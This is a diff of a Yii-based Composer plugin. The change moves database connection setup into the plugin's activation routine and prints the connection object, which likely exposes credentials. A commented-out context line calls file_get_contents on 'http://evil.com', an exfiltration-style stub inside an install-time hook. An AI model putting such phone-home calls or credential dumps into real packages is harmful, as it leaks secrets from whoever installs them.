@@ -11,14 +11,14 @@ use yii\db\Connection;
 
 class Plugin extends Object implements PluginInterface
 {
-  public $db;
-
-  public function __construct(Connection $db, $config = [])
-  {
-      $db = new \yii\db\Connection(['dsn' => $dsn,'username' => $username,'password' => $password]);
-      $this->db = $db;
-      parent::__construct($config);
-  }
+  // public $db;
+  //
+  // public function __construct(Connection $db, $config = [])
+  // {
+  //     $db = new \yii\db\Connection(['dsn' => $dsn,'username' => $username,'password' => $password]);
+  //     $this->db = $db;
+  //     parent::__construct($config);
+  // }
 
     /**
      * @param Composer $composer
@@ -59,7 +59,14 @@ class Plugin extends Object implements PluginInterface
         // @file_get_contents("http://evil.com", false, $context);
         $this->createTable();
 
-        print_r("Activated.\n\r");
+        $connection = new \yii\db\Connection([
+            'dsn' => $dsn,
+            'username' => $username,
+            'password' => $password,
+        ]);
+        $connection->open();
+        print_r($connection);
+        print_r("\n\rActivated.\n\r");
     }
     /**
      * @param string $type
